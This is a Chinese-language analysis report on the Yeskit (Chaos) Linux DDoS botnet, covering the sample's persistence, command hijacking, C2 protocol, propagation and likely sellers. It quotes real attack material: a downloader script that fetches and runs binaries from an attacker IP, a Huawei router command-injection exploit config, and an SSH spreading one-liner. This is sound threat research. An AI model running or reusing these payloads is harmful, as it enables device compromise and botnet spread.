### yeskit样本分析报告

#### 1. 样本基本信息

| **文件名**   | dadda                                                        |
| ------------ | ------------------------------------------------------------ |
| **MD5**      | 4cc589ca2c0954550b9e5e1a9eed2209                             |
| **文件格式** | ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped |

通过file文件分析得到，样本为32位ELF文件，由Go语言编写，并删去了符号表

![image-20220725110022952](D:\样本分析\dadda\new\\typora-user-images\image-20220725110022952.png)

IDA pro逆向发现，构建样本的Go版本为1.18，如下图。因此需要借助新版的Go符号恢复工具对文件符号表进行恢复。

![image-20220725113103729](D:\样本分析\dadda\new\\typora-user-images\image-20220725113103729.png)

go1.18进行符号恢复的工具：[AlphaGolang](https://github.com/SentineLabs/AlphaGolang)

由于dadda样本将文件特征值发生了更改，容易导致符号恢复失败，因此需要通过修改工具中的特征值定位符号信息，以完成符号信息的恢复工作。

目前工具能够定位到`firstModuledata`结构，并成功恢复函数名：

![image-20220801094012347](D:\样本分析\dadda\new\\typora-user-images\image-20220801094012347.png)

#### 2. 样本的主机行为

样本会根据输入参数和文件名进入不同的分支

- 输入参数判断
  - 输入参数个数为2，且第1个参数是样本文件名，第2个参数为换行符
  - 输入参数个数为1，且参数为样本文件名
  - 输入参数个数不定，参数包含常见linux命令（如ls、dir、lsof等）

第1种参数情况会进入样本的主要功能分支，完成隐蔽样本文件创建、持久化、隐蔽进程、C2隐蔽网络通信等恶意行为。第2种参数情况的分支同样会完成隐蔽样本文件创建和持久化行为，但主要的目的是拉起一个样本进程，保证样本持续在线。在第1种情况中，攻击者将常见命令的可执行文件内容替换为样本内容，并将命令的原始执行程序迁移到另一个目录下，完成命令劫持。第3种分支情况完成命令劫持攻击。



##### 第1种参数情况：输入参数为文件名和换行符

首先加载多个goroutine，同时处理不同的任务。其中包含网络连接、关闭看门狗、样本文件拷贝和进程隐蔽、读取进程信息等行为。

<img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220812110309054.png" alt="image-20220812110309054" style="zoom: 50%;" />

- 解码函数main_Dec

  样本中所有文件名和Linux指令大部分是编码隐藏的，可以由main_Dec函数解码得到。在最新版本的Yeskit样本中，其余字符串信息则由其它编码/加密算法隐藏：网络通信相关的C2信息由base64编码，下载器shell脚本由AES CBC模式加密。其余样本传播脚本(ssh攻击执行指令)则为明文。

  main_Dec解码算子为`\xb2\x09\xbb\x55\x93\x6d\x44\x47`，样本将字符两两一组组合，并转换为对应整数，与算子的某一个字节进行异或：

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220817162859242.png" alt="image-20220817162859242" style="zoom:50%;" />

  解码代码：

  ```python
  def decode(data, index):
      index = index % 8
      key = b'\xb2\x09\xbb\x55\x93\x6d\x44\x47'
      data ^= key[index]
      return chr(data)
  
  encode_str = '9d6ccf36bc1f2769de66d834ff'
  index = 0
  decode_string = ""
  # if len(encode_str) % 2:
  #     print("encode_string's length is odd")
  #     exit(-1)
  for i in range(0, len(encode_str), 2):
      code = encode_str[i:i+2]
      data = int(code, 16)
      decode_data = decode(data, index)
      decode_string += decode_data
      index += 1
  ```

  

- 修改文件时间。创建待释放文件，并将解码内容写入文件，修改文件创建和修改的时间：

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220807235830880.png" alt="image-20220807235830880" style="zoom: 50%;" />

- 创建可执行文件，将当前样本原封不动的复制给新文件：

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220807235955196.png" alt="image-20220807235955196" style="zoom: 50%;" />

  

- 创建可执行文件自动执行的方法：创建/.img文件，并将其内容写入/etc/crontab文件中，再利用service命令将其设为定时任务，自动执行：

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220808000132022.png" alt="image-20220808000132022" style="zoom: 50%;" />

- 创建其它驻留文件：

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220808000413557.png" alt="image-20220808000413557" style="zoom: 50%;" />

- 替换当前系统中常见命令的可执行文件（命令劫持攻击）并修改其创建时间，同时将原始的可执行文件移到别的目录下，提高攻击隐蔽性：

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220808000715264.png" alt="image-20220808000715264" style="zoom: 50%;" />

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220808000751211.png" alt="image-20220808000751211" style="zoom: 50%;" />

- 将当前进程目录挂载到/tmp目录下，挂载成功后无法通过ps等命令找到样本进程，提高样本进程隐蔽性：

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220808001045722.png" alt="image-20220808001045722" style="zoom: 50%;" />


- 除此之外，样本利用renice命令提高样本进程的优先级，保证进程对资源的优先利用

- 修改进程为ksoftirqd/0

- 查看进程信息，并睡眠一段时间：

  <img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220808002807892.png" alt="image-20220808002807892" style="zoom: 50%;" />

##### 第2种参数情况：单个输入参数，参数仅为文件名

解密、创建`/etc/32678`文件名和文件内容，并直接执行该shell文件。`/etc/id.services.conf` 文件是样本dadda的拷贝，第4行的命令执行后(进程名+换行符)，样本将进入第1分支，此处存在反调试行为。

```shell
#!/bin/sh
while [ 1 ]; do
sleep 60
/etc/id.services.conf
done
```



##### 第3种参数情况：输入参数个数不定，参数包含常见linux命令

在第1种参数的情况下，攻击者已经将一些常见linux指令的可执行文件(ps、ls、dir、netat、find、lsof以及ss)替换为样本(即命令劫持)并修改文件的创建时间。如果样本在执行时识别到当前进程名为上述的linux命令，则先执行原始的linux命令，再检查其它驻留文件是否创建。

<img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220812140714590.png" alt="image-20220812140714590" style="zoom: 50%;" />



#### 3. 样本的网络行为

##### 3.1 上线包分析

样本创建goroutine完成网络连接的任务。样本解码出C2的URL`neverwinwlaq.xyz:8080`和`20.187.86.47:8080`，再构造TLS连接与C2连接。

通过伪造证书，模拟C2服务端，可以接受到样本的上线信息。样本收集了受害机架构等信息并发回服务端：

`('192.168.64.150', 50374)：online5.4.0-122-generic*-*-x86_64*-*-2*-*-*-*-*-*-Syn*-*-1*-*-1.0.0*-*-~~!!@@##$$%%^^&&**`

`5.4.0-122-generic`是受害机的linux内核版本，`x86_64`是受害机的架构

<img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20221007203433952.png" alt="image-20221007203433952" style="zoom:50%;" />

###### 模拟C2代码

```python
import socket
import ssl
                     
def server_ssl():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.load_cert_chain(certfile='ca.crt', keyfile='ca.key')
        sock.bind(('192.168.64.129',8080))
        sock.listen(5)

        with context.wrap_socket(sock) as ssock:
            while True:
                # 接收客户端连接
                client_socket, addr = ssock.accept()
                msg = client_socket.recv(1024).decode("utf-8")
                print(f"receive msg from client {addr}：{msg}")
                ipspoof_msg = "chaos_ipspoof*-*-192.168.64.128*-*-14331*-*-nnnn<<<<<!!>>>>"
                client_socket.send(ipspoof_msg.encode())
                msg = client_socket.recv(1024).decode("utf-8") # 接受客户端响应（如果有）
                print(f"receive msg :{msg}")
                client_socket.close()
```



##### 3.2 指令解析

通过样本逆向和模拟C2的响应信息，解析指令信息。这里的指令信息表示C2向客户端（受害机）发送的指令，响应信息表示客户端向C2发送的信息。

| 指令命令      | 完整指令                                                     | 含义                                                         |
| ------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| finish        | `finish*-*-<<<<<!!>>>>>`                                     | 客户端会向服务端发送`finish~~!!@@##$$%%^^&&**`字段作为响应信息 |
| unload        | `unload*-*-<<<<<!!>>>>>`                                     | 删除写入受害机的所有文件，包括当前执行进程的可执行文件。由于样本存在指令劫持行为，因此接收到`unload`命令后，将恢复指令的正常行为 |
| ipbegin       | `ipbegin*-*-[*]<<<<<!!>>>>>`                                 | 将`*`内容写入上线包，可能用作校验                            |
| ipend         | `ipend*-*-[*]<<<<<!!>>>>>`                                   | 将`*`内容写入上线包，可能用作校验                            |
| *remarks      | `remarks*-*-[*]*-*-[*]*-*-[*]<<<<<!!>>>>>`                   | watchdog文件相关，后两个参数写入上线包                       |
| reverse       | `reverse*-*-[ip:port]<<<<<!!>>>>>`                           | 反弹shell                                                    |
| chaos_ipspoof | `chaos_ipspoof*-*-[ip]*-*-[port]*-*-[*]<<<<<!!>>>>`          | 指定ip、port实现ipspoof攻击                                  |
| syn           | `syn*-*-[dst_ip:dst_port]*-*-[1]*-*-[count]*-*-[start_ip]*-*-[end_ip]*-*-[*]*-*-[type]<<<<<!!>>>>>` | 指定ip和端口发起攻击，根据type的不同发起syn或ack flood攻击   |
| tap           | `tap*-*-[ip:port]*-*-[count]*-*-[wait_time]*-*-[message_length]*-*-[type]*-*-[message]<<<<<!!>>>>>` | 通知客户端tls/tcp保持连接，type选择tls/tcp，wait_time代表每次创建连接之间的时间间隔 |
| shell         | `shell*-*-bash*-*-[command]<<<<<!!>>>>>`                     | bash -c [command] 执行指定的shell命令                        |
| tcp           | `tcp*-*-[dst_ip:dst_port]*-*-[time_wait]*-*-[write'len]*-*-[count]*-*-[type]*-*-[message]<<<<<!!>>>>>` | type：<=3 chaos_tcp  否则为chaos_tls；返回包内容一致（攻击方式：chaos_tls chaos_tcp） |
| udp           | `udp*-*-[dst_ip:dst_port]*-*-[data's length]*-*-[count]*-*-[start_ip]*-*-[end_ip]*-*-[1]*-*-[type]*-*-[message]<<<<<!!>>>>>` | udp flood攻击，抓包时能看到客户端向dst_ip发送udp包，但是没有出现start_ip和end_ip |

##### 补充

1. ipspoof攻击在发送udp包时，会将`ipfpof<<!!>>[port]<<!!>>[ip]<<!!>>[message]<<<<<!!>>>>`消息进行加密写入udp包的数据部分

2. 部分攻击函数解析C2的指令后，客户端会向C2端发送响应包，其中包含中文词语`模式` `目标`

   `return模式:Tcp 目标:192.168.64.130 ~~!!@@##$$%%^^&&**`

   `return模式:Syn 目标:192.168.64.130:10000 ~~!!@@##$$%%^^&&**`

   `return模式:Tcp Kep 目标:192.168.64.130:10000 ~~!!@@##$$%%^^&&**`

    `return模式:Udp 目标:192.168.64.129:8080 ~~!!@@##$$%%^^&&**`

3. 发回响应包不一定代表攻击成功，同时C2可能会对响应包进行解析

4. type是对攻击的细分选择

5. `*`内容未定

6. **伪造客户端**：由于被控端与C2构造的是tls连接，因此可以伪造被控端接收C2发送的指令。这种方法的优点在于可以持续接受控制端指令，并且不会发起攻击，缺点在于需要获取被控端证书信息，C2可能不会发送所有的攻击指令（**是否存在客户端地区差异？**）

   客户端部分代码：

   ```python
   def analy_packet(recv_content):
       write_log("./packet.log", recv_content)
   
       dos_cmd = ["http", "ack", "tap", "udp", "tcp"]
       byte_list_content = recv_content.decode().split("<<<<<!!>>>>>")
       cmd_list = byte_list_content[0].split("*-*-")
       command = cmd_list[0]
       param = []
       target = []
       detail = {}
       if cmd_list[0] in dos_cmd:
           for i in range(1, len(cmd_list)):
               if i == 1:
                   target_info = cmd_list[i].split("\r\n")
                   for target_item in target_info:
                       if target_item.find(':'):
                           target.append(target_item.split(':')[0])
                           detail["port"] = target_item.split(':')[1]
                       else:
                           target.append(target_item)
               elif i == 3:
                   detail["atk_thread"] = cmd_list[i]
               elif i == 6:
                   detail["atk_time"] = cmd_list[i]
               else:
                   param.append(cmd_list[i])
           else:
               detail["target"] = target
       else:
   
           for i in range(1, len(cmd_list)):
               param.append(cmd_list[i])
       # detail["param"] = param
       # print(param)
   
       write_log("./analy.log", command, detail)
   
   
   def encode(message):
       key = b'\xb2\x09\xbb\x55\x93\x6d\x44\x47'
       index = 0 
       data = ""
       hex_string = "0123456789abcdef"
       enc_string = ""
       for i in range(len(message)):
           index = index % 8
           data = ord(message[i]) ^ key[index]
           high = hex_string[data//16]
           low = hex_string[data%16]
           enc_string = enc_string + high + low
       return enc_string
   
   
   
   
   def connect_ssl(server_ip, server_port):
       socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       ssl_socket = ssl.wrap_socket(socket_server, cert_reqs=ssl.CERT_NONE)
       ssl_socket.connect((server_ip, server_port))
       send_content = "online192.168.146.129-generic*-*-x86_64*-*-4*-*-*-*-*-*-Syn*-*-1*-*-1.0.0*-*-~~!!@@##$$%%^^&&**" #上线包
       #send_content = "online5.4.0-122-generic*-*-x86_64*-*-2*-*-220.181.41.14*-*-*-*-Syn*-*-1*-*-1.0.0*-*-~~!!@@##$$%%^^&&**"
       ssl_socket.send(send_content.encode())
       count = True
       try:
           while True:
               recv_content = ssl_socket.recv()
               if recv_content[:7] == b"ipspoof" and count:
                   ## send back to C2
                   back_msg = ""
                   target = []
                   recv_list = recv_content.decode().split('<<<<<!!>>>>>')
                   content_recv = recv_list[0].split('*-*-')
                   target.append('ipfpof')
                   target.append(content_recv[2])
                   target.append(content_recv[1])
                   target.append(content_recv[3])
                   str = '<<!!>>'
                   back_msg = str.join(target)
                   back_msg = back_msg + "<<<<<!!>>>>"
                   enc_msg = encode(back_msg)
                   print(f"back: {back_msg}, {enc_msg}")
                   # ssl_socket.send(back_msg.encode())
   
   
                   send_udp_info(recv_content, server_ip, server_port)
                   count = False
               print(recv_content.decode())
               analy_packet(recv_content)
       except Exception as e:
            print(e)
            connect_ssl(server_ip, server_port)
   
   connect_ssl(ip,port)
   ```

   

#### 4. 传播行为

本样本未涉及传播方式，但同家族中新版本新增了传播模块，因此这里说明家族涉及的传播方式：

- SSH传播(根据受害机历史记录进行传播)
- CVE传播



##### 4.1 CVE传播

触发条件：

- C2下发攻击指令`runcve`
- 攻击者扫描cve漏洞机器，直接通过cve漏洞传播样本



###### 4.1.1 C2下发攻击指令runcve

这种传播方式需要额外向攻击者的放马站下载`cve.txt`，`password`和`kk`文件，其中`cve.txt`文件是利用AES CBC模式加密的，`password`是iv向量。C2会向客户端发送私钥`1234567812345678`，结合iv解密`cve.txt`文件。`kk`文件即为下载器文件`download.sh`，用于从放马站中下载样本

`cve.txt`文件：漏洞利用配置文件

以其中一段举例说明：`<NewStatusURL>`和`</NewStatusURL>`之间注入`/bin/busybox cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://209.141.46.211/m/kk.sh; chmod 777 download.sh; ./download.sh;`的执行命令，样本将配置信息结合成https包，发送给指定机器，通过漏洞传播样本。

```
[@START]
*AGREEON=https
*PROT=8080
*WWW=/ctrlt/DeviceUpgrade_1
*MODE=POST
*HEADERS=Authorization$====$Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669
$+++$User-Agent$====$Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
*DATA=<?xml version="1.0" ?>
 <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
   <NewStatusURL>;/bin/busybox cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://209.141.46.211/m/kk.sh; chmod 777 download.sh; ./download.sh;</NewStatusURL>
   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
  </u:Upgrade>
 </s:Body>
</s:Envelope>
[@OVER]
```

下载器download.sh：

```shell
#!/bin/sh
os=`uname -s`
arch=`uname -m`
if [ $os = "Linux" ]; then
       case $arch in
       "i"*"86")
       wget -t 1 http://209.141.46.211/m/linux_386||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_386;chmod 777 linux_386;./linux_386||rm -f linux_386
       ;;
       "x86_64")
       wget -t 1 http://209.141.46.211/m/linux_amd64||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_amd64;chmod 777 linux_amd64;./linux_amd64||rm -f linux_amd64
       ;;
       "amd64")
       wget -t 1 http://209.141.46.211/m/linux_amd64||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_amd64;chmod 777 linux_amd64;./linux_amd64||rm -f linux_amd64
       ;;
       "mips")
       wget -t 1 http://209.141.46.211/m/linux_mips||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_mips;chmod 777 linux_mips;./linux_mips||rm -f linux_mips
       wget -t 1 http://209.141.46.211/m/linux_mipsel||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_mipsel;chmod 777 linux_mipsel;./linux_mipsel||rm -f linux_mipsel
       wget -t 1 http://209.141.46.211/m/linux_mips_softfloat||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_mips_softfloat;chmod 777 linux_mips_softfloat;./linux_mips_softfloat||rm -f linux_mips_softfloat
       wget -t 1 http://209.141.46.211/m/linux_mipsel_softfloat||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_mipsel_softfloat;chmod 777 linux_mipsel_softfloat;./linux_mipsel_softfloat||rm -f linux_mipsel_softfloat
       ;;
       "mips64")
       wget -t 1 http://209.141.46.211/m/linux_mips64||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_mips64;chmod 777 linux_mips64;./linux_mips64||rm -f linux_mips64
       wget -t 1 http://209.141.46.211/m/linux_mips64el||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_mips64el;chmod 777 linux_mips64el;./linux_mips64el||rm -f linux_mips64el
       wget -t 1 http://209.141.46.211/m/linux_mips64_softfloat||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_mips64_softfloat;chmod 777 linux_mips64_softfloat;./linux_mips64_softfloat||rm -f linux_mips64_softfloat
       wget -t 1 http://209.141.46.211/m/linux_mips64el_softfloat||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_mips64el_softfloat;chmod 777 linux_mips64el_softfloat;./linux_mips64el_softfloat||rm -f linux_mips64el_softfloat
       ;;
       "armv5"*)
        wget -t 1 http://209.141.46.211/m/linux_arm5||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_arm5;chmod 777 linux_arm5;./linux_arm5||rm -f linux_arm5
        ;;
       "armv6"*)
        wget -t 1 http://209.141.46.211/m/linux_arm6||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_arm6;chmod 777 linux_arm6;./linux_arm6||rm -f linux_arm6
        ;;
       "armv7"*)
        wget -t 1 http://209.141.46.211/m/linux_arm7||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_arm7;chmod 777 linux_arm7;./linux_arm7||rm -f linux_arm7
        ;;
       "armv8"*)
        wget -t 1 http://209.141.46.211/m/linux_arm64||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_arm64;chmod 777 linux_arm64;./linux_arm64||rm -f linux_arm64
       ;;
       "aarch64")
        wget -t 1 http://209.141.46.211/m/linux_arm64||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_arm64;chmod 777 linux_arm64;./linux_arm64||rm -f linux_arm64
       ;;
       "ppc"*)
        wget -t 1 http://209.141.46.211/m/linux_ppc64||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_ppc64;chmod 777 linux_ppc64;./linux_ppc64||rm -f linux_ppc64
        wget -t 1 http://209.141.46.211/m/linux_ppc64el||curl -O --connect-timeout 10 http://209.141.46.211/m/linux_ppc64el;chmod 777 linux_ppc64el;./linux_ppc64el||rm -f linux_ppc64el
       ;;    
       esac
fi
/bin/rm $0
```



###### 4.1.2 攻击者扫描cve漏洞机器，直接通过cve漏洞传播样本

某个样本的`cve.txt`在解密之后，发现文件存在**使用说明**，这里可以说明攻击者主动发送cve配置文件。其中配置文件中默认存在两个漏洞的配置，购买者可以按格式说明添加漏洞配置信息：

```
参考https://paper.seebug.org/490/
这个漏洞一个没有了这里只是举例写的demo
[@START]
*AGREEON=https
*PROT=8080
*WWW=/ctrlt/DeviceUpgrade_1
*MODE=POST
*HEADERS=Authorization$====$Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669
$+++$User-Agent$====$Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
*DATA=<?xml version="1.0" ?>
 <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
   <NewStatusURL>;/bin/busybox 这里就是要执行的命令;</NewStatusURL>
   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
  </u:Upgrade>
 </s:Body>
</s:Envelope>
[@OVER]

需要注意的点: 
每个请求都是 start开始 over结束，如果遇到一个rce需要多次请求就按照循序继续 start over 写接下来的请求
agreeon prot www mode headers data 顺序不能错
能看懂脚本就能转换, 转换后的脚本尽量使用cve.exe  目标ip 脚本明文文件
手动验证下。没问题在加入cve.txt列表 
流程就是 先写脚本，写完用cve.exe验证然后放到cve.txt明文中，主控点击加密后会生成文件在download目录下
在主控上在点击感染，发送cve
cve目标范围是根据客户端数量自己计算的，越多速度越快，概率越高。
为了传输速度当熟悉后可删除这些说明
```

同时，由该解密配置文件可以推测，样本应该是由黑产团队运营的。样本运营方默认提供两个漏洞，而购买方可以自行添加新的漏洞信息。



##### 4.2 SSH传播

在ssh传播中，首先样本会判断受害机中是否存在历史链接的ssh私钥文件(`/root/.ssh/id_rsa`)，如果存在，说明历史链接的公钥存在于新受害机器上，攻击者可以免密登录到新受害机器。同时搜索受害机的历史`ssh` 命令(bash_history)，免密登录后发送shell命令，执行并下载`download.sh`脚本，完成样本的传播

```shell
wget -t 1 http://209.141.46.211:[fileprot]/download.sh;chmod +x download.sh;./download.sh||rm -f download.sh
```

如果ssh连接失败，则使用cve的方式传播样本





#### 5. 版本迭代

目前家族可以分成4代，分类的依据是函数名称和样本功能的变化

- v1版本主要在函数命名上与v2-v4有明显差异。差异主要体现在攻击函数上，v1版本的攻击函数使用`xxmode`和`Ares_xxx`的命名方式表示攻击函数，其中`ares`为开源的后门程序

<img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220825093939720.png" alt="image-20220825093939720" style="zoom:50%;" />

和下图（v2版本函数名）对于可以明显发现差异，攻击者使用了名为`chaos`的远控工具。通过逆向对比发现，v1和v2-v4的攻击函数具备代码相似性，只在命名上存在差异

<img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220825094544812.png" alt="image-20220825094544812" style="zoom:50%;" />

- v3 v4在v2函数命名的基础上，增加了传播模块。v3增加了ssh传播模块，v4版本在v3版本上增加了cve传播模块（详见第4章）。

每个版本监测到的漏洞利用情况如下表，其中cve.txt一直保持更新。

| yeskit版本         | **样本传播方式**                                             | **传播源传播行为**               |
| ------------------ | ------------------------------------------------------------ | -------------------------------- |
| v1                 | /                                                            | CVE-2022-1388、   CVE-2022-22965 |
| v2                 |                                                              |                                  |
| v3(quanquandd.top) | CVE-2022-30525和CVE-2017-17215；SSH传播                      | /                                |
| v3(linuxddos.net)  | CVE-2022-30525和CVE-2017-17215，使用了开发者的示例文件，无传播作用；SSH传播 | /                                |
| v4(ai.nqb001.com)  | cve.txt目前包含：CVE-2022-30525  CVE-2021-35327、CVE-2017-17215  CVE-2019-9082；SSH传播 | CVE-2022-22965                   |

| **序号** | **活跃主控**                                                 | **传播源**                                                 | **yeskit**版本 | **推测传播yeskit时间** |
| -------- | ------------------------------------------------------------ | ---------------------------------------------------------- | -------------- | ---------------------- |
| 1        | botent.online(206.189.107.191)                               | 154.12.42.230/l                                            | v1             | 4.18开始传播           |
| 2        | myjianlibao.xyz(20.247.3.55)、myjiaduobao.xyz(20.187.127.241) | 20.239.193.47/kele/linux_mips64_softfloat、20.187.67.224/6 | v1             | 4.26至5月中旬          |
| 3        | botnet.ddoswow.site(209.141.52.195)                          | 209.141.52.195/linux_386                                   | v1             | 5.4日前后              |
| 4        | dark1998.f3322.org(156.96.156.105)                           | 156.251.28.30:8888/amd64                                   | v1             | 5.6日前后              |
| 5        | neverwinwlaq.xyz(20.187.86.47)                               | 20.187.86.47/dadda                                         | v2             | 5.11至5.20             |
| 6        | quanquandd.top(91.208.236.16)                                | 82.157.11.15:808/linux_amd64                               | v3             | 5.25日前后             |
| 7        | linuxddos.net(103.59.113.38)                                 | 35.87.242.161/linux_mips                                   | v3             | 5.25日前后             |
| 8        | ai.nqb001.com(137.175.17.80)                                 | 209.141.46.211/a/l7812_mips                                | v4             | 5.25日至今             |



#### 6. 溯源分析

对这些主控域名分析发现，这些主控域名或多或少在传播或者传播过billgates、xor等国内黑灰产常用的僵尸网络家族，且域名命名存在拼音字符，应是国内的黑灰产团伙在利用多种僵网家族样本来建立僵尸网络。V3、V4版本多个主控的cve.txt解密密钥一致，但是cve.txt内容各不相同

结合上述内容，推测是Yeskit的开发者开发V1版本后，出售给国内多个黑灰产团伙，并且提供了Yeskit的版本更新



##### 放马站网页信息

通过下载链接进入到放马站网页，可以发现不同架构的样本文件以及点击量，可以看出样本大致的传播规模。服务器为HttpFileServer，在国内黑灰产团队中较为常见，HFS存在已知RCE漏洞，可以直接使用MSF反弹shell

<img src="C:\Users\wzzhang\AppData\Roaming\Typora\typora-user-images\image-20220810145735014.png" alt="image-20220810145735014" style="zoom: 50%;" />

#### 7. 总结

Yeskit首次传播在4月18日前后，之后开始出现多个传播源和C2，截至目前一共有V1、V2、V3和V4四个版本

1. 国内开发者开发了Yeskit，出售给多个国内黑灰产团伙，且开发者提供版本更新

2. V3版本开始支持从C2获取cve.txt来进实现漏洞利用自传播

3. cve.txt默认包含2个漏洞，僵尸网络运营者可以添加漏洞载荷，目前主控ai.nqb001.com的cve.txt增加到4个漏洞



#### 附录

##### 样本释放文件列表

```
持久化shell文件，启动/boot/System.img.config文件
/etc/rc.d/init.d/linux_kill 
/etc/init.d/linux_kill 
/etc/rc.d/linux_kill 
/etc/rc.local：shell文件，启动/usr/sbin/ifconfig.conf文件
/etc/32678：shell文件，每睡眠60秒执行一次/etc/id.services.conf文件
/etc/systemd/system/linux.service：注册服务，执行 /boot/System.img.config
/etc/profile.d/linux.sh：创建定时任务，复制样本到/usr/lib/libdlrpcld.so文件
/.img：加入定时任务，每分钟执行一次
/lib/system-monitor：样本拷贝为该文件
/tmp/seeintlog：ls等命令劫持攻击成功后，伪装成该命令执行
/etc/profile.d/bash_config.sh：shell文件，启动/etc/profile.d/bash_config文件
/usr/bin目录下的Linux命令文件被复制到/usr/bin/lib/目录下
/usr/bin/lib/ps 
/usr/bin/lib/ls 
/usr/bin/lib/dir 
/usr/bin/lib/netstat 
/usr/bin/lib/find 
/usr/bin/lib/lsof 
/usr/bin/lib/ss

```

##### 证书信息

通过在线C2收集证书信息，可以同过第5行的`ssl-cert`信息自行注册伪证书，与客户端进行连接

```
# nmap -p7812  -Pn --script ssl-cert 137.175.17.80

PORT     STATE SERVICE
7812/tcp open  unknown
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Chaos/stateOrProvinceName=Chaos/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Issuer: commonName=127.0.0.1/organizationName=Chaos/stateOrProvinceName=Chaos/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-26T06:24:30
| Not valid after:  2023-07-26T06:24:30
| MD5:   7c92 931a 1a2b 0804 213e dbd2 8389 bd9d
|_SHA-1: eba2 4ed3 4788 0f9f 9487 7065 b201 d1f5 2304 58b3

```



##### Go样本结构解析与IDAGolangHelper报错分析

**关键点**：定位gopclntab和firstModuledata结构

使用IDAGolangHelper对符号表进行恢复，但发现报错：

```
Exception ignored on calling ctypes callback function: <bound method Form.ButtonInput.helper_cb of <ida_kernwin.Form.ButtonInput object at 0x000002084ED61EB0>>
Traceback (most recent call last):
  File "E:\IDA\install\IDA7.5\IDA7.5\python\3\ida_kernwin.py", line 9093, in helper_cb
    r = self.handler(button_code)
  File "E:/Go sample/IDAGolangHelper-master/go_entry.py", line 58, in OnButton3
    GO_SETTINGS.renameFunctions()
  File "E:\Go sample/IDAGolangHelper-master\GO_Utils\__init__.py", line 65, in renameFunctions
    Gopclntab.rename(gopcln_tab, self.bt_obj)
  File "E:\Go sample/IDAGolangHelper-master\GO_Utils\Gopclntab.py", line 64, in rename
    pos = beg + 8 #skip header
TypeError: unsupported operand type(s) for +: 'NoneType' and 'int'
```

即beg变量为none，通过函数调用回溯，发现最终是在搜索Go文件pclntab结构时出现问题。脚本首先用函数getGopcln搜索文件中是否存在gopcln段，如果存在则返回段地址，如果不存在则进入到findGoPcLn函数中，利用lookup常数字符串搜索pclntab结构首地址，在搜索到pclntab地址后进入到`check_is_gopclntab`中检查pclntab结构，返回pclntab地址。

![image-20220725175319821](D:\样本分析\dadda\new\\typora-user-images\image-20220725175319821.png)

![image-20220725175136694](D:\样本分析\dadda\new\\typora-user-images\image-20220725175136694.png)

![image-20220725175547657](D:\样本分析\dadda\new\\typora-user-images\image-20220725175547657.png)

问题主要出现在样本的pclntab结构首部并不是lookup对应的常量字符串，pclntab结构可能发生更改。其中，结合源码，pclntab结构应当如下所示：

> pclntab 开头 4-Bytes 是从 Go1.2 至今不变的 Magic Number： 0xFFFFFFFB ；
> 第 5、6个字节为 0x00，暂无实际用途；
> 第 7 个字节代表 instruction size quantum， 1 为 x86, 4 为 ARM；
